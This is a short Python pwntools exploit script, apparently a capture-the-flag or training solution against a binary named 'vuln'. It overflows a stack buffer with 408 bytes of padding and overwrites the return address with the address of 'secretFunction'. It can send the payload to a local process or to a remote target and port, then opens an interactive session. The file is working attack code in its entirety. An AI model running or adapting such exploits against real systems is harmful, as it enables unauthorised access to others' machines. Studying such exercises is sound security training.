import pwn
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("choice", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)

args = parser.parse_args()

elf = pwn.ELF("./vuln")

# Buffer overflow at 400 bytes

# Test offset at 408 bytes
# secret function address 0x4011d6
new_rip =  pwn.p64(elf.symbols["secretFunction"])
print(new_rip)
return_main = pwn.p64(elf.symbols["main"])
print(return_main)

payload = b"".join(
        [
            b"A" * 408,
            new_rip,
            return_main,
        ]
    )

payload += b"\n"

if args.choice == "local":
    p = elf.process()

elif args.choice == "remote":
    if not args.target or not args.port:
        pwn.warning("Supply -t <target> and -p <port>")
        exit()
    p = pwn.remote(args.target, args.port)

p.sendline(payload)
p.interactive()

